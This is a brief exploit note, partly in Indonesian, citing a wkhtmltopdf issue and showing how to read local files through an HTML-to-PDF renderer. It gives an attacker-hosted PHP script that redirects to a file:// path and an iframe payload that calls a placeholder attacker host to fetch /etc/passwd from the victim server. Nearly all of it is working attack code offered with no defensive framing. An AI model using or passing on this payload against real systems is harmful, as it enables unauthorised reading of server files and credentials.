Ref: https://github.com/wkhtmltopdf/wkhtmltopdf/issues/3570

Attacker -- Victim

Host PHP Attacker
```
<?php
     $file = $_GET['file'];
     header("location:file://$file");
?>
```

Akses php file dari victim menggunakan iframe,img,etc
```
<iframe src='http://attackerIP/t.php?file=/etc/passwd></iframe>
```

